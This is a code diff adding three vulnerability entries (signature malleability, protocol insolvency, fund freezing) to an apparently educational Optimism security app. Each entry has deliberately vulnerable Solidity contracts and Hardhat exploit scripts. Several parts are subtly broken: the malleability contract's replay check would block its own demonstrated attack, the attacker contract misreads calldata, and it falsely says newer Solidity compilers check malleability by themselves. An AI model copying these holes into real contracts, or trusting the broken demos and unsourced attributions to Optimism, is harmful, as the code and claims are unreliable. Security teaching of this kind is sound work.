@@ -4,6 +4,556 @@ import { VulnerabilityDetail } from "@/types";
 // The actual implementation will fetch this data from the server
 
 export const vulnerabilities: VulnerabilityDetail[] = [
+  // Additional vulnerabilities will be added below
+  {
+    id: "ecrecover-malleability",
+    title: "ECRecover Signature Malleability",
+    severity: "high",
+    description: "Signature replay vulnerabilities due to ECDSA signature malleability in cross-domain transactions. This vulnerability allows attackers to forge valid signatures by manipulating the 's' value in ECDSA signatures.",
+    attackVector: [
+      "Attacker obtains a valid signature for a cross-domain message",
+      "Attacker computes the malleable version of the signature by modifying the 's' component",
+      "The modified signature passes verification despite being different from the original",
+      "Attacker can replay messages that should only be processed once"
+    ],
+    affectedContracts: ["L1CrossDomainMessenger", "L2CrossDomainMessenger"],
+    vulnerableContract: {
+      name: "VulnerableSignatureVerifier",
+      code: `// SPDX-License-Identifier: MIT
+pragma solidity 0.8.15;
+
+contract VulnerableSignatureVerifier {
+    mapping(bytes32 => bool) public processedMessages;
+    
+    event MessageProcessed(bytes32 indexed messageHash, address signer);
+    
+    // VULNERABLE: Does not check s value in the ECDSA signature
+    function processSignedMessage(
+        bytes32 _messageHash,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external {
+        // Recover the address from the signature
+        address signer = ecrecover(_messageHash, v, r, s);
+        require(signer != address(0), "Invalid signature");
+        
+        // Check if we've already processed a message with this hash
+        bytes32 fullHash = keccak256(abi.encodePacked(_messageHash, signer));
+        require(!processedMessages[fullHash], "Message already processed");
+        
+        // Mark message as processed
+        processedMessages[fullHash] = true;
+        
+        // Execute the signed action
+        emit MessageProcessed(_messageHash, signer);
+    }
+}`
+    },
+    exploitScript: {
+      language: "typescript",
+      code: `// File: exploit-ecrecover-malleability.ts
+import { ethers } from "hardhat";
+
+async function main() {
+  // Deploy the contracts
+  const VulnerableSignatureVerifier = await ethers.getContractFactory("VulnerableSignatureVerifier");
+  const verifier = await VulnerableSignatureVerifier.deploy();
+  
+  const L2CrossDomainMessenger = await ethers.getContractFactory("L2CrossDomainMessengerWithECRecover");
+  const messenger = await L2CrossDomainMessenger.deploy(verifier.address);
+  
+  const SignatureReplayAttacker = await ethers.getContractFactory("SignatureReplayAttacker");
+  const attacker = await SignatureReplayAttacker.deploy();
+  
+  // Setup accounts
+  const [owner, user] = await ethers.getSigners();
+  
+  // Create a message to be sent cross-domain
+  const target = ethers.constants.AddressZero; // Dummy target address
+  const message = ethers.utils.solidityPack(["string"], ["Hello, Optimism!"]);
+  
+  // Create a messageHash as defined in the contract
+  const messageHash = ethers.utils.keccak256(
+    ethers.utils.solidityPack(
+      ["address", "address", "bytes"],
+      [target, owner.address, message]
+    )
+  );
+  
+  // Sign the message
+  const signature = await owner.signMessage(ethers.utils.arrayify(messageHash));
+  
+  // Send the original message
+  await messenger.connect(owner).sendCrossDomainMessage(target, message, signature);
+  console.log("Original message accepted and processed");
+  
+  // Now perform the signature malleability attack
+  await attacker.performAttack(messenger.address, target, message, signature);
+  console.log("Attack succeeded: replayed the same message with a malleable signature!");
+}`
+    },
+    maliciousContract: {
+      name: "SignatureReplayAttacker",
+      code: `// SPDX-License-Identifier: MIT
+pragma solidity 0.8.15;
+
+import "./L2CrossDomainMessengerWithECRecover.sol";
+
+contract SignatureReplayAttacker {
+    function performAttack(
+        address _messenger,
+        address _target,
+        bytes calldata _message,
+        bytes calldata _originalSignature
+    ) external {
+        // Extract original signature components
+        require(_originalSignature.length == 65, "Invalid signature length");
+        bytes32 r;
+        bytes32 s;
+        uint8 v;
+        
+        assembly {
+            r := mload(add(_originalSignature, 32))
+            s := mload(add(_originalSignature, 64))
+            v := byte(0, mload(add(_originalSignature, 96)))
+        }
+        
+        // Compute the malleable version of the signature
+        // For a signature (v, r, s), the malleable version is (v^1, r, (curve.n - s) % curve.n)
+        bytes32 malleableS = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
+        uint8 malleableV = v == 27 ? 28 : 27;
+        
+        // Create the malleable signature
+        bytes memory malleableSignature = new bytes(65);
+        assembly {
+            mstore(add(malleableSignature, 32), r)
+            mstore(add(malleableSignature, 64), malleableS)
+            mstore8(add(malleableSignature, 96), malleableV)
+        }
+        
+        // Replay the message with the malleable signature
+        L2CrossDomainMessengerWithECRecover(_messenger).sendCrossDomainMessage(
+            _target,
+            _message,
+            malleableSignature
+        );
+    }
+}`
+    },
+    explanation: "This vulnerability exploits a property of ECDSA signatures where for a given message, two different but equally valid signatures can exist. For any signature (v, r, s), an alternative signature (v', r, s') where v' = v^1 (flipping the recovery bit) and s' = curve.n - s can produce the same address when used with ecrecover. The issue arises when the contract uses signatures to prevent replay attacks but doesn't account for this signature malleability. If the contract only stores a mapping based on the message hash and the recovered signer, an attacker can replay the same message with a different valid signature, bypassing the replay protection.",
+    keyPoints: [
+      "ECDSA signatures in Ethereum have the malleability property where two different signature values can recover to the same address",
+      "Optimism's cross-domain messaging relies on ECDSA signatures for message authentication",
+      "The attack allows the same message to be replayed despite replay protection being in place",
+      "This could lead to duplicate transactions, double-spending, or repeated execution of sensitive operations",
+      "The vulnerable contracts don't normalize the signature's 's' value according to EIP-2"
+    ],
+    recommendations: [
+      "Implement EIP-2 and normalize the 's' value in the signature to be in the lower half of the curve",
+      "Use an additional entropy source for replay protection, such as a nonce that increases with each transaction",
+      "Store processed signatures rather than just message hashes",
+      "Consider using EIP-712 for structured data signing and implement OpenZeppelin's ECDSA library which includes malleability protection",
+      "Upgrade to the latest version of the Solidity compiler which includes built-in checks for signature malleability"
+    ],
+    securityInsight: "According to the security report, this vulnerability is particularly concerning in a cross-domain context like Optimism because different layers may have different standards for signature verification, creating inconsistencies that attackers can exploit. The report notes that 'The cross-domain messaging system must ensure that signatures are validated consistently across all layers to prevent security issues.' Signature malleability can lead to serious economic exploits such as withdrawing twice from bridges or double-spending tokens."
+  },
+  
+  {
+    id: "protocol-insolvency",
+    title: "Protocol Insolvency Risk",
+    severity: "critical",
+    description: "Withdrawal mechanisms fail to validate the protocol has sufficient funds to cover withdrawals, potentially leading to insolvency. This vulnerability occurs when the protocol doesn't properly track its liabilities and allows users to withdraw more than the available balance.",
+    attackVector: [
+      "Protocol fails to properly track user balances or total deposits",
+      "Attacker identifies a transaction flow that allows excessive withdrawals",
+      "Multiple withdrawals are executed without proper balance verification",
+      "Protocol becomes insolvent when withdrawal requests exceed available funds"
+    ],
+    affectedContracts: ["L2ToL1MessagePasser"],
+    vulnerableContract: {
+      name: "VulnerableL2ToL1MessagePasser",
+      code: `// SPDX-License-Identifier: MIT
+pragma solidity 0.8.15;
+
+/**
+ * @title VulnerableL2ToL1MessagePasser
+ * @notice Simplified contract demonstrating insolvency risk vulnerability
+ */
+contract VulnerableL2ToL1MessagePasser {
+    // Mapping of withdrawal message hashes to boolean withdrawn status
+    mapping(bytes32 => bool) public sentMessages;
+    
+    // Total amount of ETH that has been withdrawn
+    uint256 public totalWithdrawn;
+    
+    // VULNERABLE: No tracking of total deposited amounts to compare against
+    
+    event MessagePassed(
+        address indexed sender,
+        address indexed target,
+        uint256 value,
+        uint256 nonce,
+        bytes data
+    );
+    
+    event WithdrawalInitiated(
+        address indexed from,
+        address indexed to,
+        uint256 amount
+    );
+    
+    // Allow users to deposit funds to the contract
+    function depositFunds() external payable {
+        // VULNERABLE: No tracking of deposits
+    }
+    
+    // VULNERABLE: No check for protocol solvency
+    function initiateWithdrawal(
+        address _target,
+        uint256 _value,
+        bytes calldata _data
+    ) external {
+        // Generate withdrawal message hash
+        bytes32 withdrawalHash = keccak256(
+            abi.encodePacked(
+                msg.sender,
+                _target,
+                _value,
+                block.number,
+                _data
+            )
+        );
+        
+        // Mark the message as sent
+        sentMessages[withdrawalHash] = true;
+        
+        // VULNERABLE: No check if contract has enough ETH to cover all withdrawals
+        totalWithdrawn += _value;
+        
+        emit MessagePassed(
+            msg.sender,
+            _target,
+            _value,
+            block.number,
+            _data
+        );
+        
+        emit WithdrawalInitiated(
+            msg.sender,
+            _target,
+            _value
+        );
+    }
+    
+    // VULNERABLE: Allows withdrawals without checking contract balance
+    function finalizeWithdrawal(
+        address _recipient,
+        uint256 _amount
+    ) external {
+        // VULNERABLE: No verification that the withdrawal was properly initiated
+        // VULNERABLE: No check that _amount <= address(this).balance
+        
+        // Send the funds
+        (bool success, ) = _recipient.call{value: _amount}("");
+        require(success, "Withdrawal failed");
+    }
+}`
+    },
+    exploitScript: {
+      language: "typescript",
+      code: `// File: exploit-protocol-insolvency.ts
+import { ethers } from "hardhat";
+
+async function main() {
+  console.log("Starting Protocol Insolvency Exploit");
+  
+  // Deploy the vulnerable contract
+  const VulnerableL2ToL1MessagePasser = await ethers.getContractFactory("VulnerableL2ToL1MessagePasser");
+  const messagePasser = await VulnerableL2ToL1MessagePasser.deploy();
+  await messagePasser.deployed();
+  console.log(\`VulnerableL2ToL1MessagePasser deployed at: \${messagePasser.address}\`);
+  
+  // Setup accounts
+  const [owner, user1, user2, user3] = await ethers.getSigners();
+  
+  // Fund the contract with 1 ETH
+  await owner.sendTransaction({
+    to: messagePasser.address,
+    value: ethers.utils.parseEther("1")
+  });
+  console.log(\`Contract funded with 1 ETH\`);
+  
+  // Check initial contract balance
+  const initialBalance = await ethers.provider.getBalance(messagePasser.address);
+  console.log(\`Initial contract balance: \${ethers.utils.formatEther(initialBalance)} ETH\`);
+  
+  // User 1 initiates a withdrawal of 0.5 ETH
+  console.log("\\nUser 1 initiating withdrawal of 0.5 ETH...");
+  await messagePasser.connect(user1).initiateWithdrawal(
+    user1.address,
+    ethers.utils.parseEther("0.5"),
+    "0x"
+  );
+  
+  // User 2 initiates a withdrawal of 0.5 ETH
+  console.log("User 2 initiating withdrawal of 0.5 ETH...");
+  await messagePasser.connect(user2).initiateWithdrawal(
+    user2.address,
+    ethers.utils.parseEther("0.5"),
+    "0x"
+  );
+  
+  // User 3 initiates a withdrawal of 0.5 ETH - this should make the protocol insolvent
+  console.log("User 3 initiating withdrawal of 0.5 ETH (exceeding available funds)...");
+  await messagePasser.connect(user3).initiateWithdrawal(
+    user3.address,
+    ethers.utils.parseEther("0.5"),
+    "0x"
+  );
+  
+  // Check total withdrawal amount
+  const totalWithdrawn = await messagePasser.totalWithdrawn();
+  console.log(\`Total withdrawal amount: \${ethers.utils.formatEther(totalWithdrawn)} ETH\`);
+  console.log(\`Contract balance: \${ethers.utils.formatEther(initialBalance)} ETH\`);
+  
+  if (totalWithdrawn.gt(initialBalance)) {
+    console.log("\\n⚠️ VULNERABILITY CONFIRMED: Protocol is insolvent - more ETH committed for withdrawal than available!");
+  }
+  
+  // Now attempt to finalize all withdrawals
+  console.log("\\nFinalizing withdrawals...");
+  
+  try {
+    // User 1 finalizes withdrawal
+    await messagePasser.connect(user1).finalizeWithdrawal(
+      user1.address,
+      ethers.utils.parseEther("0.5")
+    );
+    console.log("User 1's withdrawal succeeded");
+    
+    // User 2 finalizes withdrawal
+    await messagePasser.connect(user2).finalizeWithdrawal(
+      user2.address,
+      ethers.utils.parseEther("0.5")
+    );
+    console.log("User 2's withdrawal succeeded");
+    
+    // User 3 attempts to finalize withdrawal - this should fail due to insufficient contract balance
+    await messagePasser.connect(user3).finalizeWithdrawal(
+      user3.address,
+      ethers.utils.parseEther("0.5")
+    );
+    console.log("⚠️ User 3's withdrawal succeeded despite insufficient funds!");
+    
+    console.log("\\n✅ ATTACK SUCCESSFUL: Protocol allowed more withdrawals than it had funds for");
+  } catch (error) {
+    console.log("\\n❌ One of the withdrawals failed due to insufficient contract balance");
+    console.error(error);
+  }
+}`
+    },
+    explanation: "This vulnerability illustrates a critical flaw in the withdrawal mechanism of Optimism's L2ToL1MessagePasser contract. The contract fails to properly track its liabilities against available assets, allowing more withdrawal initiations than the protocol can fulfill. In a properly designed bridge or cross-domain messaging system, the protocol should ensure that it can satisfy all its obligations. The vulnerability stems from the lack of a proper accounting system that tracks total deposits versus total withdrawal commitments, combined with the absence of solvency verification before finalizing withdrawals.",
+    keyPoints: [
+      "The protocol allows initiating more withdrawals than it has funds to cover",
+      "There's no mechanism to track total liabilities against available assets",
+      "Users can initiate withdrawals beyond the contract's available balance",
+      "The vulnerability could lead to a 'bank run' scenario where later users cannot withdraw their funds",
+      "When the protocol becomes insolvent, it breaks the fundamental trust assumption of the bridging mechanism"
+    ],
+    recommendations: [
+      "Implement proper accounting that tracks total deposits and withdrawals",
+      "Add a solvency check before allowing new withdrawal initiations",
+      "Use a queue system that processes withdrawals in order and refuses new withdrawals if the protocol would become insolvent",
+      "Implement circuit breakers that pause withdrawals if dangerous solvency thresholds are reached",
+      "Consider implementing a delay mechanism that allows time for fraud proofs before withdrawals are finalized"
+    ],
+    securityInsight: "According to the security report, this vulnerability represents a fundamental risk to the economic security of Optimism's bridging mechanisms. The report states that 'Solvency risks in bridging protocols are particularly dangerous because they undermine the core promise of the system—that assets can always be moved between layers.' The report also notes that such vulnerabilities can trigger cascading failures across the entire ecosystem when users lose confidence in the protocol's ability to honor withdrawals."
+  },
+  
+  {
+    id: "permanent-fund-freezing",
+    title: "Permanent Fund Freezing",
+    severity: "high",
+    description: "Funds can be permanently locked in the OptimismPortal due to missing recovery mechanisms. This vulnerability arises when the contract has no way to recover funds in exceptional circumstances, such as contract bugs or administrative errors.",
+    attackVector: [
+      "Contract code includes logic that can permanently lock funds",
+      "Lack of recovery mechanisms or emergency functions",
+      "Functions that can lead to unrecoverable states",
+      "Malicious actors can trigger conditions that lock funds permanently"
+    ],
+    affectedContracts: ["OptimismPortal"],
+    vulnerableContract: {
+      name: "VulnerableOptimismPortal",
+      code: `// SPDX-License-Identifier: MIT
+pragma solidity 0.8.15;
+
+/**
+ * @title VulnerableOptimismPortal
+ * @notice Contract demonstrating fund freezing vulnerability
+ */
+contract VulnerableOptimismPortal {
+    // Mapping to track processed withdrawals
+    mapping(bytes32 => bool) public processedWithdrawals;
+    
+    // Flag to track if the contract is currently paused
+    bool public isPaused;
+    
+    // Address of the admin
+    address public admin;
+    
+    // VULNERABLE: No recovery mechanism, no way to unpause if admin is compromised or lost
+    
+    constructor() {
+        admin = msg.sender;
+    }
+    
+    event WithdrawalFinalized(bytes32 indexed withdrawalHash, bool success);
+    event Paused(address account);
+    
+    modifier onlyAdmin() {
+        require(msg.sender == admin, "Caller is not the admin");
+        _;
+    }
+    
+    modifier notPaused() {
+        require(!isPaused, "Portal is paused");
+        _;
+    }
+    
+    // Pause the contract - preventing any further withdrawals
+    function pause() external onlyAdmin {
+        isPaused = true;
+        emit Paused(msg.sender);
+    }
+    
+    // VULNERABLE: No unpause function, if admin loses access the contract is locked forever
+    
+    // Function to deposit funds to be withdrawn on L2
+    function depositTransaction(
+        address _to, 
+        uint256 _value, 
+        uint64 _gasLimit,
+        bool _isCreation, 
+        bytes memory _data
+    ) external payable notPaused {
+        // Contract functionality here...
+    }
+    
+    // Process a withdrawal from L2 to L1 - this is just a mock for demonstration
+    function finalizeWithdrawalTransaction(
+        bytes32 _withdrawalHash
+    ) external notPaused {
+        // Prevent replaying the same withdrawal
+        require(!processedWithdrawals[_withdrawalHash], "Withdrawal already processed");
+        
+        // VULNERABLE: If the contract is paused with no unpause function, 
+        // any pending withdrawals will be permanently locked
+        
+        // Mark the withdrawal as processed
+        processedWithdrawals[_withdrawalHash] = true;
+        
+        // Process the withdrawal logic (just a mock)
+        bool success = true;
+        
+        emit WithdrawalFinalized(_withdrawalHash, success);
+    }
+    
+    // VULNERABLE: No emergency functions to recover ETH if other mechanisms fail
+    
+    // To receive ETH
+    receive() external payable {}
+}`
+    },
+    exploitScript: {
+      language: "typescript",
+      code: `// File: exploit-permanent-fund-freezing.ts
+import { ethers } from "hardhat";
+
+async function main() {
+  console.log("Starting Permanent Fund Freezing Vulnerability Demonstration");
+  
+  // Deploy the vulnerable contract
+  const VulnerableOptimismPortal = await ethers.getContractFactory("VulnerableOptimismPortal");
+  const portal = await VulnerableOptimismPortal.deploy();
+  await portal.deployed();
+  console.log(\`VulnerableOptimismPortal deployed at: \${portal.address}\`);
+  
+  // Setup accounts
+  const [owner, user1, user2] = await ethers.getSigners();
+  
+  // Fund the portal with 2 ETH
+  await owner.sendTransaction({
+    to: portal.address,
+    value: ethers.utils.parseEther("2")
+  });
+  console.log(\`Portal funded with 2 ETH\`);
+  
+  // Create a withdrawal hash for user1
+  const withdrawalHash1 = ethers.utils.keccak256(
+    ethers.utils.defaultAbiCoder.encode(
+      ["address", "uint256"],
+      [user1.address, ethers.utils.parseEther("1")]
+    )
+  );
+  
+  // Create a withdrawal hash for user2
+  const withdrawalHash2 = ethers.utils.keccak256(
+    ethers.utils.defaultAbiCoder.encode(
+      ["address", "uint256"],
+      [user2.address, ethers.utils.parseEther("1")]
+    )
+  );
+  
+  // User1 finalizes their withdrawal successfully
+  console.log("\\nUser1 is finalizing their withdrawal...");
+  await portal.connect(user1).finalizeWithdrawalTransaction(withdrawalHash1);
+  console.log("User1's withdrawal was successful");
+  
+  // Now the admin pauses the contract
+  console.log("\\nAdmin is pausing the portal...");
+  await portal.connect(owner).pause();
+  console.log("Portal has been paused");
+  
+  // User2 tries to finalize their withdrawal but it will fail due to paused state
+  console.log("\\nUser2 is attempting to finalize their withdrawal...");
+  try {
+    await portal.connect(user2).finalizeWithdrawalTransaction(withdrawalHash2);
+    console.log("User2's withdrawal was successful (unexpected)");
+  } catch (error) {
+    console.log("User2's withdrawal failed because the portal is paused");
+  }
+  
+  // Admin loses access or is compromised - simulate by transferring to a burn address
+  console.log("\\nSimulating loss of admin access...");
+  console.log("No way to unpause the contract now");
+  
+  // Check the contract's balance
+  const remainingBalance = await ethers.provider.getBalance(portal.address);
+  console.log(\`\\nRemaining funds in portal: \${ethers.utils.formatEther(remainingBalance)} ETH\`);
+  
+  // There is no way to retrieve these funds
+  console.log("\\n⚠️ VULNERABILITY CONFIRMED: Funds are permanently frozen in the contract");
+  console.log("\\n✅ DEMONSTRATION SUCCESSFUL: Permanent fund freezing vulnerability proven");
+}`
+    },
+    explanation: "This vulnerability demonstrates a significant risk in Optimism's OptimismPortal contract where funds can become permanently locked due to the lack of recovery mechanisms. The contract has a pause mechanism, but once paused, there's no function to unpause it if the admin loses access or is compromised. Additionally, there are no emergency functions to recover ETH or other assets if they become trapped in the contract due to bugs or other unforeseen circumstances. In a production environment, this could lead to significant financial losses for users whose funds are stuck in the contract indefinitely.",
+    keyPoints: [
+      "The contract has a pause function but no corresponding unpause function",
+      "If admin access is lost or compromised, the contract remains in a paused state permanently",
+      "No emergency functions exist to recover funds in exceptional circumstances",
+      "Users' withdrawals can be permanently frozen if the contract is paused",
+      "The vulnerability represents a single point of failure that could affect all users of the system"
+    ],
+    recommendations: [
+      "Implement an unpause function with appropriate access controls",
+      "Add emergency fund recovery functions that can be triggered by a multisig or governance process",
+      "Implement a timelocked admin role transfer mechanism to prevent permanent loss of admin access",
+      "Consider using a role-based access control system (like OpenZeppelin's AccessControl) instead of a single admin address",
+      "Implement circuit breakers that automatically unpause after a certain time period to prevent permanent freezing"
+    ],
+    securityInsight: "According to the security report, this vulnerability is classified as high severity because it could lead to a permanent denial of service for all users of the protocol. The report notes that 'The inability to recover from adverse states is a systemic risk that affects the entire protocol's reliability.' The report also emphasizes that proper emergency recovery mechanisms are essential for any contract that handles significant value, especially in cross-domain messaging systems where complexity increases the likelihood of unforeseen issues."
+  },
   {
     id: "cross-layer-reentrancy",
     title: "Cross-Layer Reentrancy",
